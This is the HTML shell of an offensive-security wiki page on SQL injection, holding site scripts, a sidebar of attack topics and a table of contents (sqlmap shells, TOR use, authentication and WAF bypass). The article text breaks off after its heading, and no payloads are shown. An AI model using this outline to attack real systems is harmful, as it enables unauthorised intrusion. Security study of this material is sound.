<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="All about SQL injection techniques, methods, payloads, how/why/when they work.">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="SQL Injection" />
<meta property="og:description" content="All about SQL injection techniques, methods, payloads, how/why/when they work." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/sql_injection/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-01-27T03:10:54-05:00" />
<title>SQL Injection | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce="v6fQG2hYHmw1rpUUC6mr9w"></script><script nonce="v6fQG2hYHmw1rpUUC6mr9w">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();</script>
<script>(function(){

'use strict';var aa=function(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}},ba="function"==typeof Object.create?Object.create:function(a){var b=function(){};b.prototype=a;return new b},k;if("function"==typeof Object.setPrototypeOf)k=Object.setPrototypeOf;else{var m;a:{var ca={a:!0},n={};try{n.__proto__=ca;m=n.a;break a}catch(a){}m=!1}k=m?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+" is not extensible");return a}:null}
var p=k,q=function(a,b){a.prototype=ba(b.prototype);a.prototype.constructor=a;if(p)p(a,b);else for(var c in b)if("prototype"!=c)if(Object.defineProperties){var d=Object.getOwnPropertyDescriptor(b,c);d&&Object.defineProperty(a,c,d)}else a[c]=b[c];a.v=b.prototype},r=this||self,da=function(){},t=function(a){return a};var u;var w=function(a,b){this.g=b===v?a:""};w.prototype.toString=function(){return this.g+""};var v={},x=function(a){if(void 0===u){var b=null;var c=r.trustedTypes;if(c&&c.createPolicy){try{b=c.createPolicy("goog#html",{createHTML:t,createScript:t,createScriptURL:t})}catch(d){r.console&&r.console.error(d.message)}u=b}else u=b}a=(b=u)?b.createScriptURL(a):a;return new w(a,v)};var A=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)};var B={},C=null;var D="function"===typeof Uint8Array;function E(a,b,c){return"object"===typeof a?D&&!Array.isArray(a)&&a instanceof Uint8Array?c(a):F(a,b,c):b(a)}function F(a,b,c){if(Array.isArray(a)){for(var d=Array(a.length),e=0;e<a.length;e++){var f=a[e];null!=f&&(d[e]=E(f,b,c))}Array.isArray(a)&&a.s&&G(d);return d}d={};for(e in a)Object.prototype.hasOwnProperty.call(a,e)&&(f=a[e],null!=f&&(d[e]=E(f,b,c)));return d}
function ea(a){return F(a,function(b){return"number"===typeof b?isFinite(b)?b:String(b):b},function(b){var c;void 0===c&&(c=0);if(!C){C={};for(var d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),e=["+/=","+/","-_=","-_.","-_"],f=0;5>f;f++){var h=d.concat(e[f].split(""));B[f]=h;for(var g=0;g<h.length;g++){var l=h[g];void 0===C[l]&&(C[l]=g)}}}c=B[c];d=Array(Math.floor(b.length/3));e=c[64]||"";for(f=h=0;h<b.length-2;h+=3){var y=b[h],z=b[h+1];l=b[h+2];g=c[y>>2];y=c[(y&3)<<
4|z>>4];z=c[(z&15)<<2|l>>6];l=c[l&63];d[f++]=""+g+y+z+l}g=0;l=e;switch(b.length-h){case 2:g=b[h+1],l=c[(g&15)<<2]||e;case 1:b=b[h],d[f]=""+c[b>>2]+c[(b&3)<<4|g>>4]+l+e}return d.join("")})}var fa={s:{value:!0,configurable:!0}},G=function(a){Array.isArray(a)&&!Object.isFrozen(a)&&Object.defineProperties(a,fa);return a};var H;var J=function(a,b,c){var d=H;H=null;a||(a=d);d=this.constructor.u;a||(a=d?[d]:[]);this.j=d?0:-1;this.h=null;this.g=a;a:{d=this.g.length;a=d-1;if(d&&(d=this.g[a],!(null===d||"object"!=typeof d||Array.isArray(d)||D&&d instanceof Uint8Array))){this.l=a-this.j;this.i=d;break a}void 0!==b&&-1<b?(this.l=Math.max(b,a+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(c)for(b=0;b<c.length;b++)a=c[b],a<this.l?(a+=this.j,(d=this.g[a])?G(d):this.g[a]=I):(d=this.l+this.j,this.g[d]||(this.i=this.g[d]={}),(d=this.i[a])?
G(d):this.i[a]=I)},I=Object.freeze(G([])),K=function(a,b){if(-1===b)return null;if(b<a.l){b+=a.j;var c=a.g[b];return c!==I?c:a.g[b]=G([])}if(a.i)return c=a.i[b],c!==I?c:a.i[b]=G([])},M=function(a,b){var c=L;if(-1===b)return null;a.h||(a.h={});if(!a.h[b]){var d=K(a,b);d&&(a.h[b]=new c(d))}return a.h[b]};J.prototype.toJSON=function(){var a=N(this,!1);return ea(a)};
var N=function(a,b){if(a.h)for(var c in a.h)if(Object.prototype.hasOwnProperty.call(a.h,c)){var d=a.h[c];if(Array.isArray(d))for(var e=0;e<d.length;e++)d[e]&&N(d[e],b);else d&&N(d,b)}return a.g},O=function(a,b){H=b=b?JSON.parse(b):null;a=new a(b);H=null;return a};J.prototype.toString=function(){return N(this,!1).toString()};var P=function(a){J.call(this,a)};q(P,J);function ha(a){var b,c=(a.ownerDocument&&a.ownerDocument.defaultView||window).document,d=null===(b=c.querySelector)||void 0===b?void 0:b.call(c,"script[nonce]");(b=d?d.nonce||d.getAttribute("nonce")||"":"")&&a.setAttribute("nonce",b)};var Q=function(a,b){b=String(b);"application/xhtml+xml"===a.contentType&&(b=b.toLowerCase());return a.createElement(b)},R=function(a){this.g=a||r.document||document};R.prototype.appendChild=function(a,b){a.appendChild(b)};var S=function(a,b,c,d,e,f){try{var h=a.g,g=Q(a.g,"SCRIPT");g.async=!0;g.src=b instanceof w&&b.constructor===w?b.g:"type_error:TrustedResourceUrl";ha(g);h.head.appendChild(g);g.addEventListener("load",function(){e();d&&h.head.removeChild(g)});g.addEventListener("error",function(){0<c?S(a,b,c-1,d,e,f):(d&&h.head.removeChild(g),f())})}catch(l){f()}};var ia=r.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),ja=r.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),ka=r.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),la=function(a,b,c){this.h=a;this.j=new R(this.h);this.g=null;this.i=[];this.l=!1;this.o=b;this.m=c},V=function(a){if(a.h.body&&!a.l){var b=
function(){T(a);r.setTimeout(function(){return U(a,3)},50)};S(a.j,a.o,2,!0,function(){r[a.m]||b()},b);a.l=!0}},T=function(a){for(var b=W(1,5),c=0;c<b;c++){var d=X(a);a.h.body.appendChild(d);a.i.push(d)}b=X(a);b.style.bottom="0";b.style.left="0";b.style.position="fixed";b.style.width=W(100,110).toString()+"%";b.style.zIndex=W(2147483544,2147483644).toString();b.style["background-color"]=ma(249,259,242,252,219,229);b.style["box-shadow"]="0 0 12px #888";b.style.color=ma(0,10,0,10,0,10);b.style.display=
"flex";b.style["justify-content"]="center";b.style["font-family"]="Roboto, Arial";c=X(a);c.style.width=W(80,85).toString()+"%";c.style.maxWidth=W(750,775).toString()+"px";c.style.margin="24px";c.style.display="flex";c.style["align-items"]="flex-start";c.style["justify-content"]="center";d=Q(a.j.g,"IMG");d.className=A();d.src=ia;d.style.height="24px";d.style.width="24px";d.style["padding-right"]="16px";var e=X(a),f=X(a);f.style["font-weight"]="bold";f.textContent=ja;var h=X(a);h.textContent=ka;Y(a,
e,f);Y(a,e,h);Y(a,c,d);Y(a,c,e);Y(a,b,c);a.g=b;a.h.body.appendChild(a.g);b=W(1,5);for(c=0;c<b;c++)d=X(a),a.h.body.appendChild(d),a.i.push(d)},Y=function(a,b,c){for(var d=W(1,5),e=0;e<d;e++){var f=X(a);b.appendChild(f)}b.appendChild(c);c=W(1,5);for(d=0;d<c;d++)e=X(a),b.appendChild(e)},W=function(a,b){return Math.floor(a+Math.random()*(b-a))},ma=function(a,b,c,d,e,f){return"rgb("+W(Math.max(a,0),Math.min(b,255)).toString()+","+W(Math.max(c,0),Math.min(d,255)).toString()+","+W(Math.max(e,0),Math.min(f,
255)).toString()+")"},X=function(a){a=Q(a.j.g,"DIV");a.className=A();return a},U=function(a,b){0>=b||null!=a.g&&0!=a.g.offsetHeight&&0!=a.g.offsetWidth||(na(a),T(a),r.setTimeout(function(){return U(a,b-1)},50))},na=function(a){var b=a.i;var c="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];b=c?c.call(b):{next:aa(b)};for(c=b.next();!c.done;c=b.next())(c=c.value)&&c.parentNode&&c.parentNode.removeChild(c);a.i=[];(b=a.g)&&b.parentNode&&b.parentNode.removeChild(b);a.g=null};var pa=function(a,b,c,d,e){var f=oa(c),h=function(l){l.appendChild(f);r.setTimeout(function(){f?(0!==f.offsetHeight&&0!==f.offsetWidth?b():a(),f.parentNode&&f.parentNode.removeChild(f)):a()},d)},g=function(l){document.body?h(document.body):0<l?r.setTimeout(function(){g(l-1)},e):b()};g(3)},oa=function(a){var b=document.createElement("div");b.className=a;b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.left="-10000px";b.style.top="-10000px";b.style.zIndex="-10000";return b};var L=function(a){J.call(this,a)};q(L,J);var qa=function(a){J.call(this,a)};q(qa,J);var ra=function(a,b){this.l=a;this.m=new R(a.document);this.g=b;this.i=K(this.g,1);b=M(this.g,2);this.o=x(K(b,4)||"");this.h=!1;b=M(this.g,13);b=x(K(b,4)||"");this.j=new la(a.document,b,K(this.g,12))};ra.prototype.start=function(){sa(this)};
var sa=function(a){ta(a);S(a.m,a.o,3,!1,function(){a:{var b=a.i;var c=r.btoa(b);if(c=r[c]){try{var d=O(P,r.atob(c))}catch(e){b=!1;break a}b=b===K(d,1)}else b=!1}b?Z(a,K(a.g,14)):(Z(a,K(a.g,8)),V(a.j))},function(){pa(function(){Z(a,K(a.g,7));V(a.j)},function(){return Z(a,K(a.g,6))},K(a.g,9),K(a.g,10),K(a.g,11))})},Z=function(a,b){a.h||(a.h=!0,a=new a.l.XMLHttpRequest,a.open("GET",b,!0),a.send())},ta=function(a){var b=r.btoa(a.i);a.l[b]&&Z(a,K(a.g,5))};(function(a,b){r[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];r[a]=da;b.apply(null,d)}})("__h82AlnkH6D91__",function(a){"function"===typeof window.atob&&(new ra(window,O(qa,window.atob(a)))).start()});}).call(this);

window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hVTV9oOG1BMHF6c2xHRlBZR0xrS2g0UHRVX21ERkZSWVBjcTFBZU1aN0diVW5xSGRzNlR5OUZTYWlsM0thZ28tb19BU3hqbjRyZFdLOGhzVUlHbmFqalZRXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZScnBMVGFzQ1JjSDBxSkpfSVhRWmd1YXQxZ292Ty01YlN0WUJXNGJUTThTNjlTdUU0WkVQVnZKZ0E2WC1UY1VNTlRLbXc3V1hLU2NoY1pJaHFOTVJ2UmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFUxMG44RWlxNnBhUEw5Q1lOcjBZcG1xdTVuZzVzTkR3Zm5yN1pSRVExWEt5UlBLMFJxS1RST2Y0Q3B5S0pIUFpVem83MldIU3VrbWlKb1p4c2Y2RzJwLWdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZDb2RlRVZCbFQxdXA5MUMzZ0V0dVFROVVxbVBSVGwwS2Qyc1FqcF9GWHV3WGxFYUhVekNvSWIxUzJtQnZ4T3Q5eHJra19vNWRXbWFfYl83dl9JRlVpeHdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VjRnWnE1WHlLaXVNS3lHdUU1Y2ZISDdoNWUtb0VVZktOekNTWEgzYmN2U285OTNYLTFuc0VkU19SZjRjUTNYZjZJSEdyaGFIb1FNc1hqMFhZUGcwMFU5d1x1MDAzZFx1MDAzZCJd");</script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/dotnet/" class="">.NET Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/node/" class="">Node Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/php/" class="">PHP Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/java/" class="">Insecure Deserialization - Java</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="active">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>SQL Injection</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#sql-injection">SQL injection</a>
      <ul>
        <li><a href="#entry-point-detection">Entry point detection</a></li>
        <li><a href="#dbms-identification">DBMS Identification</a></li>
        <li><a href="#sql-injection-using-sqlmap">SQL injection using SQLmap</a>
          <ul>
            <li><a href="#basic-arguments-for-sqlmap">Basic arguments for SQLmap</a></li>
            <li><a href="#load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</a></li>
            <li><a href="#custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</a></li>
            <li><a href="#second-order-injection">Second order injection</a></li>
            <li><a href="#shell">Shell</a></li>
            <li><a href="#crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</a></li>
            <li><a href="#using-tor-with-sqlmap">Using TOR with SQLmap</a></li>
            <li><a href="#using-a-proxy-with-sqlmap">Using a proxy with SQLmap</a></li>
            <li><a href="#using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</a></li>
            <li><a href="#using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</a></li>
            <li><a href="#general-tamper-option-and-tampers-list">General tamper option and tamper&rsquo;s list</a></li>
            <li><a href="#sqlmap-without-sql-injection">SQLmap without SQL injection</a></li>
          </ul>
        </li>
        <li><a href="#authentication-bypass">Authentication bypass</a></li>
        <li><a href="#authentication-bypass-raw-md5-sha1">Authentication Bypass (Raw MD5 SHA1)</a></li>
        <li><a href="#polyglot-injection-multicontext">Polyglot injection (multicontext)</a></li>
        <li><a href="#routed-injection">Routed injection</a></li>
        <li><a href="#insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</a></li>
        <li><a href="#waf-bypass">WAF Bypass</a>
          <ul>
            <li><a href="#white-spaces-alternatives">White spaces alternatives</a></li>
            <li><a href="#no-comma">No Comma</a></li>
            <li><a href="#no-equal">No Equal</a></li>
            <li><a href="#case-modification">Case modification</a></li>
            <li><a href="#obfuscation-by-dbms">Obfuscation by DBMS</a></li>
            <li><a href="#more-mysql-specific">More MySQL specific</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="sql-injection">
  SQL injection
  <a class="anchor" href="#sql-injection">#</a>
</h1>
<blockquote>
